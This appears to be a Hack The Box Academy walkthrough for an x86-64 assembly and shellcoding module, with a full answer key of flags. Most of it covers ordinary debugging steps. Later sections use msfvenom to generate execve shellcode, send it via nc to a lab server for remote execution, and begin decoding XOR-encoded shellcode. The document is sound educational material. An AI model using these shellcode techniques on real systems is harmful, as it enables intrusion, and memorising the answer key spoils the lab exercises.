
| Section                    | Question Number | Answer                                         |
| -------------------------- | --------------- | ---------------------------------------------- |
| Assembling & Disassembling | Question 1      | HBT{d154553m811n9\_81n42135\_2\_f1nd\_53c2375} |
| Debugging with GDB         | Question 1      | 0x21796d6564637708                             |
| Data Movement              | Question 1      | 0x400                                          |
| Arithmetic Instructions    | Question 1      | 0x0                                            |
| Loops                      | Question 1      | 0x100000000                                    |
| Unconditional Branching    | Question 1      | 0x4                                            |
| Conditional Branching      | Question 1      | 0x2                                            |
| Using the Stack            | Question 1      | HTB{pu5h1n9\_4\_57r1n9\_1n\_r3v3r53}           |
| Procedures                 | Question 1      | 0x401014                                       |
| Functions                  | Question 1      | 8                                              |
| Shellcodes                 | Question 1      | HTB{l04d3d\_1n70\_m3m0ry!}                     |
| Shellcoding Tools          | Question 1      | HTB{r3m073\_5h3llc0d3\_3x3cu710n}              |
| Skills Assessment          | Question 1      | HTB{4553mbly\_d3bugg1ng\_m4573r}               |
| Skills Assessment          | Question 2      | HTB{5h3llc0d1ng\_g3n1u5}                       |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Assembly Language

## Question 1

### "In the above 'Hello World' example, which Assembly instruction will '00001111 00000101' execute?"

Students first need to convert `111100000000101` to hexadecimal to find out that it is the `0F 05` opcode, which is for the assembly instruction [syscall](https://www.felixcloutier.com/x86/syscall.html):

![[HTB Solutions/Others/z. images/85ba6d740a303a0df887fa6f60ccf695_MD5.jpg]]

Alternatively, by reading the module section's content, students will know that `00001111 00000101` executes the `syscall` assembly instruction:

![[HTB Solutions/Others/z. images/19231e19cc0d44dbfc9c4cc30574641f_MD5.jpg]]

Answer: `syscall`

# Registers, Addresses, and Data Types

## Question 1

### "What is the 8-bit register for 'rdi'?"

The 8-bit register for `rdi` is `dil`:

![[HTB Solutions/Others/z. images/807de7b07328490e3a8087e7fb78e942_MD5.jpg]]

Answer: `dil`

# Assembling & Disassembling

## Question 1

### "Download the attached file and disassemble it to find the flag"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/disasm.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/disasm.zip
unzip disasm.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/disasm.zip

--2022-09-26 16:28:53--  https://academy.hackthebox.com/storage/modules/85/disasm.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 549 [application/zip]
Saving to: ‘disasm.zip’

disasm.zip          100%[===================>]     549  --.-KB/s    in 0s      

2022-09-26 16:28:54 (10.1 MB/s) - ‘disasm.zip’ saved [549/549]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip disasm.zip

Archive:  disasm.zip
  inflating: disasm
```

Subsequently, students need to use `objdump` with the `-s` flag to dump strings and the `-j` flag with `.data` to only examine the `.data` section, finding the flag `HBT{d154553m811n9_81n42135_2_f1nd_53c2375}`:

Code: shell

```shell
objdump -sj .data disasm
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ objdump -sj .data disasm

disasm:     file format elf64-x86-64

Contents of section .data:
 402000 4842547b 64313534 3535336d 3831316e  HBT{d154553m811n
 402010 395f3831 6e343231 33355f32 5f66316e  9_81n42135_2_f1n
 402020 645f3533 63323337 357d               d_53c2375}
```

Answer: `HBT{d154553m811n9_81n42135_2_f1nd_53c2375}`

# Debugging with GDB

## Question 1

### "Download the attached file, and find the hex value in 'rax' when we reach the instruction at <\_start+16>?"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/gdb.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/gdb.zip
unzip gdb.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/gdb.zip

--2022-09-26 16:37:55--  https://academy.hackthebox.com/storage/modules/85/gdb.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 414 [application/zip]
Saving to: ‘gdb.zip’

gdb.zip                     100%[===========================================>]     414  --.-KB/s    in 0s      

2022-09-26 16:37:55 (4.95 MB/s) - ‘gdb.zip’ saved [414/414]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip gdb.zip

Archive:  gdb.zip
  inflating: gdb
```

Subsequently, students need to debug the file "gdb", set a breakpoint at `<_start+16>`, step into the breakpoint, and then print the hexadecimal value that is in `rax`:

Code: shell

```shell
gdb -q ./gdb
b _start
run
b *_start+16
step
x $rax
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ gdb -q ./gdb

Reading symbols from ./gdb...
(No debugging symbols found in ./gdb)
(gdb) b _start
Breakpoint 1 at 0x401000
(gdb) run
Starting program: /home/htb-ac413848/gdb 

Breakpoint 1, 0x0000000000401000 in _start ()
(gdb) b *_start+16
Breakpoint 2 at 0x401010
(gdb) step
Single stepping until exit from function _start,
which has no line number information.

Breakpoint 2, 0x0000000000401010 in _start ()
(gdb) x $rax
0x21796d6564637708:	Cannot access memory at address 0x21796d6564637708
```

From the output, students will know that the hexadecimal value in `rax` is `0x21796d6564637708`.

Answer: `0x21796d6564637708`

# Data Movement

## Question 1

### "Add an instruction at the end of the attached code to move the value in "rsp" to "rax". What is the hex value of "rax" at the end of program execution?"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/mov.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/mov.zip
unzip mov.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/mov.zip

--2022-09-26 17:02:16--  https://academy.hackthebox.com/storage/modules/85/mov.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 236 [application/zip]
Saving to: ‘mov.zip’

mov.zip                     100%[===========================================>]     236  --.-KB/s    in 0s      

2022-09-26 17:02:17 (6.44 MB/s) - ‘mov.zip’ saved [236/236]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip mov.zip 
Archive:  mov.zip

  inflating: mov.s
```

Subsequently, students need to add the `mov` instruction to move the value in `rsp` to `rax` at the end of the code within the file:

Code: nasm

```nasm
global _start

section .text
_start:
    mov rax, 1024
    mov rbx, 2048
    xchg rax, rbx
    push rbx
    mov rax, [rsp]
```

Students then need to use the "assembler.sh" script that was provided in the `Assembling & Disassembling` section on the edited file, supplying the `-g` flag to debug it with `gdb`, setting a breakpoint at `_start`, running the program, single stepping once, and then printing the hexadecimal value of `rax`:

Code: shell

```shell
./assembler.sh mov.s -g
b _start
run
s
x $rax
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ./assembler.sh mov.s -g

Reading symbols from mov...
(No debugging symbols found in mov)
(gdb) b _start

Breakpoint 1 at 0x401000
(gdb) run

Starting program: /home/htb-ac413848/mov 

Breakpoint 1, 0x0000000000401000 in _start ()
(gdb) s

Single stepping until exit from function _start, which has no line number information.
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0x400

0x0000000000401011 in ?? ()
(gdb) x $rax
0x400:	Cannot access memory at address 0x400
```

From the output, students will know that the hexadecimal value of `rax` at the end of the program's execution is `0x400`.

Answer: `0x400`

# Arithmetic Instructions

## Question 1

### "Add an instruction to the end of the attached code to "xor" "rbx" with "15". What is the hex value of 'rbx' at the end?"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/arithmetic.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/arithmetic.zip
unzip arithmetic.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/arithmetic.zip

--2022-09-26 17:51:23--  https://academy.hackthebox.com/storage/modules/85/arithmetic.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 235 [application/zip]
Saving to: ‘arithmetic.zip’

arithmetic.zip              100%[===========================================>]     235  --.-KB/s    in 0s      

2022-09-26 17:51:23 (2.40 MB/s) - ‘arithmetic.zip’ saved [235/235]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip arithmetic.zip

Archive:  arithmetic.zip
  inflating: arithmetic.s
```

Subsequently, students need to use the `xor` instruction on `rbx` with the number 15 at the end of the code within the file:

Code: nasm

```nasm
global _start

section .text
_start:
    xor rax, rax
    xor rbx, rbx
    add rbx, 15
    xor rbx, 15
```

Students then need to use the "assembler.sh" script that was provided in the `Assembling & Disassembling` section on the edited file, supplying the `-g` flag to debug it with `gdb`, setting a breakpoint at `_start`, running the program, single stepping once, and then printing the hexadecimal value of `rbx`:

Code: shell

```shell
./assembler.sh mov.s -g
b _start
run
s
x $rbx
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ./assembler.sh arithmetic.s -g

Reading symbols from arithmetic...
(No debugging symbols found in arithmetic)
(gdb) b _start
Breakpoint 1 at 0x401000
(gdb) run
Starting program: /home/htb-ac413848/arithmetic 

Breakpoint 1, 0x0000000000401000 in _start ()
(gdb) s
Single stepping until exit from function _start,
which has no line number information.
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0x1

0x000000000040100e in ?? ()
(gdb) x $rbx
0x0:	Cannot access memory at address 0x0
```

From the output, students will know that the value of `rbx` at the end is `0x0`.

Answer: `0x0`

# Loops

## Question 1

### "Edit the attached assembly code to loop the "loop" label 5 times. What is the hex value of "rax" by the end?"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/loops.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/loops.zip
unzip loops.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/loops.zip

--2022-09-26 18:08:27--  https://academy.hackthebox.com/storage/modules/85/loops.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 231 [application/zip]
Saving to: ‘loops.zip’

loops.zip           100%[===================>]     231  --.-KB/s    in 0s      

2022-09-26 18:08:27 (3.18 MB/s) - ‘loops.zip’ saved [231/231]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip loops.zip

Archive:  loops.zip
  inflating: loops.s
```

Subsequently, students need to use the `loop` instruction on the loop label at the end of the code within the file:

Code: nasm

```nasm
global _start

section .text
_start:
    mov rax, 2
    mov rcx, 5
loop:
    imul rax, rax
    loop loop
```

Students then need to use the "assembler.sh" script that was provided in the `Assembling & Disassembling` section on the edited file, supplying the `-g` flag to debug it with `gdb`, setting a breakpoint at `_start`, running the program, single stepping twice, and then printing the hexadecimal value of `rax`:

Code: shell

```shell
./assembler.sh mov.s -g
b _start
run
s
s
x $rax
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ./assembler.sh loops.s -g

Reading symbols from loops...
(No debugging symbols found in loops)

(gdb) b _start

Breakpoint 1 at 0x401000
(gdb) run

Starting program: /home/htb-ac413848/loops 

Breakpoint 1, 0x0000000000401000 in _start ()
(gdb) s

Single stepping until exit from function _start, which has no line number information.
0x000000000040100a in loop ()
(gdb) s

Single stepping until exit from function loop, which has no line number information.
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0x1

0x0000000000401010 in ?? ()
(gdb) x $rax

0x100000000:	Cannot access memory at address 0x100000000
```

From the output, students will know that the hexadecimal value of `rax` at the end is `0x100000000`.

Answer: `0x100000000`

# Unconditional Branching

## Question 1

### "Try to jump to "func" before "loop loop". What is hex value of "rbx" at the end?"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/unconditional.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/unconditional.zip
unzip unconditional.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/unconditional.zip

--2022-09-26 18:40:41--  https://academy.hackthebox.com/storage/modules/85/unconditional.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 279 [application/zip]
Saving to: ‘unconditional.zip’

unconditional.zip   100%[===================>]     279  --.-KB/s    in 0s      

2022-09-26 18:40:41 (3.85 MB/s) - ‘unconditional.zip’ saved [279/279]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip unconditional.zip

Archive:  unconditional.zip
  inflating: unconditional.s
```

Subsequently, students need to use the `jmp` instruction to the `func` label before the instruction `loop loop` within the assembly file:

Code: nasm

```nasm
global _start

section .text
_start:
    mov rbx, 2
    mov rcx, 5
loop:
    imul rbx, rbx
    jmp func
    loop loop
func:
    mov rax, 60
    mov rdi, 0
    syscall
```

Students then need to use the "assembler.sh" script that was provided in the `Assembling & Disassembling` section on the edited file, supplying the `-g` flag to debug it with `gdb`, setting a breakpoint at `_start`, running the program, single stepping twice, then printing the hexadecimal value of `rbx`:

Code: shell

```shell
./assembler.sh mov.s -g
b _start
run
s
s
x $rbx
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ./assembler.sh unconditional.s -g

Reading symbols from unconditional...
(No debugging symbols found in unconditional)
(gdb) b _start

Breakpoint 1 at 0x401000
(gdb) run

Starting program: /home/htb-ac413848/unconditional 

Breakpoint 1, 0x0000000000401000 in _start ()
(gdb) s

Single stepping until exit from function _start,which has no line number information.
0x000000000040100a in loop ()
(gdb) s

Single stepping until exit from function loop, which has no line number information.
0x0000000000401012 in func ()
(gdb) x $rbx

0x4:	Cannot access memory at address 0x4
```

From the output, students will know that the hexadecimal value of `rbx` at the end is `0x4`.

Answer: `0x4`

# Conditional Branching

## Question 1

### "The attached assembly code loops forever. Try to modify (mov rax, 5) to make it not loop. What hex value prevents the loop?"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/conditional.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/conditional.zip
unzip conditional.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/conditional.zip

--2022-09-27 13:22:47--  https://academy.hackthebox.com/storage/modules/85/conditional.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 266 [application/zip]
Saving to: ‘conditional.zip’

conditional.zip               100%[==============================================>]     266  --.-KB/s    in 0s      

2022-09-27 13:22:47 (2.14 MB/s) - ‘conditional.zip’ saved [266/266]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip conditional.zip

Archive:  conditional.zip
  inflating: conditional.s
```

Students then need to analyze the assembly code file; students need to make the mov instruction move 2 (hexadecimal `0x2`) into `rax` instead of `5`, since that will accumulate 10 into `rax` when multiplied with 5, thus, when the `cmp` instruction is carried out, the result of the subtraction operation (`rax - 10`) or (`10 - 10`) is `0`:

Code: nasm

```nasm
global _start

section .text
_start:
    mov rax, 2      ; change here
    imul rax, 5
loop:
    cmp rax, 10
    jnz loop
```

Answer: `0x2`

# Using the Stack

## Question 1

### "Debug the attached binary to find the flag being pushed to the stack"

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/stack.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/stack.zip
unzip stack.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/stack.zip

--2022-09-27 13:36:17--  https://academy.hackthebox.com/storage/modules/85/stack.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 453 [application/zip]
Saving to: ‘stack.zip’

stack.zip     100%[==============================================>]     453  --.-KB/s    in 0s      

2022-09-27 13:36:17 (4.83 MB/s) - ‘stack.zip’ saved [453/453]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip stack.zip

Archive:  stack.zip
  inflating: stack
```

Subsequently, students need to debug the program with `gdb`, set a breakpoint on `_start`, then monitor the stack value by stepping gradually and printing the string value of `rsp`. Students need to step into 9 times, and then, the flag will be stored within `rsp`:

Code: shell

```shell
gdb -q ./stack
b _start
run
si 9
x/s $rsp
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ gdb -q ./stack

Reading symbols from ./stack...
(No debugging symbols found in ./stack)
(gdb) b _start

Breakpoint 1 at 0x401000
(gdb) run

Starting program: /home/htb-ac413848/stack 

Breakpoint 1, 0x0000000000401000 in _start ()
(gdb) si 9

0x000000000040102e in _start ()
(gdb) x/s $rsp

0x7fffffffdff8:	"HTB{pu5h1n9_4_57r1n9_1n_r3v3r53}"
```

Answer: `HTB{pu5h1n9_4_57r1n9_1n_r3v3r53}`

# Syscalls

## Question 1

### "What is the syscall number of "execve"?"

Students can `grep` for `execve` on `/usr/include/x86_64-linux-gnu/asm/unistd_64.h`:

Code: shell

```shell
grep "execve" /usr/include/x86_64-linux-gnu/asm/unistd_64.h
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ grep "execve" /usr/include/x86_64-linux-gnu/asm/unistd_64.h

#define __NR_execve 59
```

Answer: `59`

# Syscalls

## Question 2

### "How many arguments does "execve" take?"

Students can check the section 2 (`System Calls`) man page of `execve`:

Code: shell

```shell
man 2 execve
```

```
SYNOPSIS
   #include <unistd.h>

   int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Answer: `3`

# Procedures

## Question 1

### "Try assembling and debugging the above code, and note how "call" and "ret" store and retrieve "rip" on the stack. What is the address at the top of the stack after entering "Exit"?"

Students need to save the complete code until the subsection `CALL/RET` into a file, then use "assembler.sh" (which was provided in the `Assembling and Disassembling` section) on it, set a breakpoint on `_start`, run the program, use `ni` 3 times to step to the "`Exit`" call, then use `si` to step into the that call. At last, students need to examine the hexadecimal value of `rsp`:

Code: shell

```shell
./assembler.sh code.s -g
b _start
run
ni 3
si
x $rsp
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ./assembler.sh code.s -g

Reading symbols from code...
(No debugging symbols found in code)
(gdb) b _start

Breakpoint 1 at 0x401000
(gdb) run

Starting program: /home/htb-ac413848/code 

Breakpoint 1, 0x0000000000401000 in _start ()
(gdb) ni 3

Fibonacci Sequence:
0x000000000040100f in _start ()
(gdb) si

0x0000000000401046 in Exit ()
(gdb) x $rsp

0x7fffffffe028:	0x00401014
```

From the output, students will know that the address at the top of the stack after entering "Exit" is `0x401014`.

Answer: `0x401014`

# Functions

## Question 1

### "Try to fix the Stack Alignment in "print", so it does not crash, and prints "Its Aligned!". How much boundary was needed to be added? "write a number""

Students first need to download the [file](https://academy.hackthebox.com/storage/modules/85/functions.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/functions.zip
unzip functions.zip
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/functions.zip

--2022-09-27 21:06:22--  https://academy.hackthebox.com/storage/modules/85/functions.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 396 [application/zip]
Saving to: ‘functions.zip’

functions.zip      100%[=============>]     396  --.-KB/s    in 0s      

2022-09-27 21:06:22 (6.25 MB/s) - ‘functions.zip’ saved [396/396]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip functions.zip

Archive:  functions.zip
  inflating: functions.s
```

Analyzing the code, students will notice that there has been only 1 function call when entering the `print` label, thus, the current boundary is `0x8`. Students need to add `sub rsp, 8` at the beginning of the `print` procedure and `add rsp, 8` at the end of it:

Code: nasm

```nasm
<SNIP>

print:
    sub rsp, 8           
    mov rdi, outFormat  ; set 1st argument (Print Format)
    mov rsi, message    ; set 2nd argument (message)
    call printf         ; printf(outFormat, message)
    add rsp,8
    ret

<SNIP>
```

Now that it is aligned, students can run it:

Code: shell

```shell
nasm -f elf64 functions.s &&  ld functions.o -o functions -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 && ./functions
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nasm -f elf64 functions.s &&  ld functions.o -o functions -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 && ./functions

It's Aligned!
```

Answer: `8`

# Libc Functions

## Question 1

### "The current string format we are using only allows numbers up to 2 billion. What format can we use to allow up to 3 billion? "Check length modifiers in the 'printf' man page""

Adding the length modifier `%ll` to `%d` allows up to `64-bit` `doubles`.

Answer: `%lld`

# Shellcodes

## Question 1

### "Run this shellcode to get the flag "4831...SNIP...0f05""

Students need to use the `loader` Python script that was provided in the subsection "Loading Shellcode" on the shellcode under the subsection "Exercise Shellcode":

Code: python

```python
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
```

Code: shell

```shell
python3 loader '4831db536a0a48b86d336d307279217d5048b833645f316e37305f5048b84854427b6c303464504889e64831c0b0014831ff40b7014831d2b2190f054831c0043c4030ff0f05'
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 loader '4831db536a0a48b86d336d307279217d5048b833645f316e37305f5048b84854427b6c303464504889e64831c0b0014831ff40b7014831d2b2190f054831c0043c4030ff0f05'

HTB{l04d3d_1n70_m3m0ry!}
```

Answer: `HTB{l04d3d_1n70_m3m0ry!}`

# Shellcoding Tools

## Question 1

### "The above server simulates an exploitable server you can execute shellcodes on. Use one of the tools to generate a shellcode that prints the content of '/flag.txt', then connect to the server with "nc SERVER\_IP PORT" to send the shellcode."

Students first need to use `msfvenom` to generate a hexadecimal shellcode payload that will print the flag file "flag.txt":

Code: shell

```shell
msfvenom -p 'linux/x64/exec' CMD='cat /flag.txt' -a 'x64' --platform 'linux' -f 'hex'
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p 'linux/x64/exec' CMD='cat /flag.txt' -a 'x64' --platform 'linux' -f 'hex'

No encoder specified, outputting raw payload
Payload size: 50 bytes
Final size of hex file: 100 bytes
48b82f62696e2f7368009950545f5266682d63545e52e80e000000636174202f666c61672e747874005657545e6a3b580f05
```

Subsequently, students need to connect to the `STMIP` with the `STMPO` using `nc`, paste in the hex shellcode payload, and then run it to attain the flag:

Code: shell

```shell
nc STMIP STMPO
48b82f62696e2f7368009950545f5266682d63545e52e80e000000636174202f666c61672e747874005657545e6a3b580f05
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc 138.68.156.57 30673

48b82f62696e2f7368009950545f5266682d63545e52e80e000000636174202f666c61672e747874005657545e6a3b580f05

HTB{r3m073_5h3llc0d3_3x3cu710n}
```

Answer: `HTB{r3m073_5h3llc0d3_3x3cu710n}`

# Skills Assessment

## Question 1

### "Disassemble 'loaded\_shellcode' and modify its assembly code to decode the shellcode, by adding a loop to 'xor' each 8-bytes on the stack with the key in 'rbx'."

Students first need to download [loaded\_shellcode.zip](https://academy.hackthebox.com/storage/modules/85/loaded_shellcode.zip) and unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/85/loaded_shellcode.zip && unzip loaded_shellcode.zip
```

```
┌─[eu-academy-1]─[10.10.14.91]─[htb-ac413848@htb-a4bnsbhale]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/85/loaded_shellcode.zip && unzip loaded_shellcode.zip

--2022-12-05 05:55:31--  https://academy.hackthebox.com/storage/modules/85/loaded_shellcode.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 591 [application/zip]
Saving to: ‘loaded_shellcode.zip’

loaded_shellcode.zip                    100%[=============================================================================>]     591  --.-KB/s    in 0s      

2022-12-05 05:55:31 (7.84 MB/s) - ‘loaded_shellcode.zip’ saved [591/591]

Archive:  loaded_shellcode.zip

  inflating: loaded_shellcode
```

When using `file` on "loaded\_shellcode", students will notice that it is an `ELF 64-bit executable`:

Code: shell

```shell
file loaded_shellcode
```

```
┌─[eu-academy-1]─[10.10.14.91]─[htb-ac413848@htb-a4bnsbhale]─[~]
└──╼ [★]$ file loaded_shellcode

loaded_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

Thus, students need to attain the assembly code without machine code or addresses using `objdump`:

Code: shell

```shell
objdump -M intel --no-show-raw-insn --no-address -d loaded_shellcode
```

```
┌─[eu-academy-1]─[10.10.14.91]─[htb-ac413848@htb-a4bnsbhale]─[~]
└──╼ [★]$ objdump -M intel --no-show-raw-insn --no-address -d loaded_shellcode

loaded_shellcode:     file format elf64-x86-64

Disassembly of section .text:

<_start>:
	movabs rax,0xa284ee5c7cde4bd7
	push   rax
	movabs rax,0x935add110510849a
	push   rax
	movabs rax,0x10b29a9dab697500
	push   rax
	movabs rax,0x200ce3eb0d96459a
	push   rax
	movabs rax,0xe64c30e305108462
	push   rax
	movabs rax,0x69cd355c7c3e0c51
	push   rax
	movabs rax,0x65659a2584a185d6
	push   rax
	movabs rax,0x69ff00506c6c5000
	push   rax
	movabs rax,0x3127e434aa505681
	push   rax
	movabs rax,0x6af2a5571e69ff48
	push   rax
	movabs rax,0x6d179aaff20709e6
	push   rax
	movabs rax,0x9ae3f152315bf1c9
	push   rax
	movabs rax,0x373ab4bb0900179a
	push   rax
	movabs rax,0x69751244059aa2a3
	push   rax
	movabs rbx,0x2144d2144d2144d2
```

Subsequently, students need to replace all of the `movabs` instructions with `mov`, use the `nasm` template from the `Assembling & Disassembling` section, move `rsp` into `rdx`, assign `14` to `rcx`, then loop over 14 times to decode the contents in `rsp`:

Code: nasm

```nasm
global _start

section .data

section .text
_start:

    mov rax,0xa284ee5c7cde4bd7
    push   rax
    mov rax,0x935add110510849a
    push   rax
    mov rax,0x10b29a9dab697500
    push   rax
    mov rax,0x200ce3eb0d96459a
    push   rax
    mov rax,0xe64c30e305108462
    push   rax
    mov rax,0x69cd355c7c3e0c51
    push   rax
    mov rax,0x65659a2584a185d6
    push   rax
    mov rax,0x69ff00506c6c5000
    push   rax
    mov rax,0x3127e434aa505681
    push   rax
    mov rax,0x6af2a5571e69ff48
    push   rax
    mov rax,0x6d179aaff20709e6
    push   rax
    mov rax,0x9ae3f152315bf1c9
    push   rax
    mov rax,0x373ab4bb0900179a
    push   rax
    mov rax,0x69751244059aa2a3
    push   rax
    mov rbx,0x2144d2144d2144d2
    mov rdx, rsp
    mov rcx, 14
decode:
	xor [rdx], rbx
	add rdx, 8
	loop decode
```

